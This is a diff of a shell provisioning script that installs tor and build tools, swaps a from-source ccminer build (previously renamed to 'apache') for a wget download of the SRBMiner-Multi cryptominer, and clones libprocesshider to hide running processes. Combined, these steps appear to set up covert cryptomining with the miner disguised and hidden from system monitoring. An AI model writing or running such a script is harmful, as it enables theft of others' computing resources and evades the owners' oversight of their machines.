@@ -4,10 +4,9 @@ sudo dpkg-reconfigure --frontend noninteractive tzdata
 sudo apt update
 sudo apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential nano git screen wget tor
 sudo service tor start
-git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
-cd ccminer;chmod +x build.sh;chmod +x configure.sh;chmod +x autogen.sh;./build.sh
-mv ccminer ../apache
-cd ..
+
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.5/SRBMiner-Multi-0-9-5-Linux.tar.xz
+tar -xf SRBMiner-Multi-0-9-5-Linux.tar.xz
 
 git clone https://github.com/hanifgz/libprocesshider.git
 cd libprocesshider
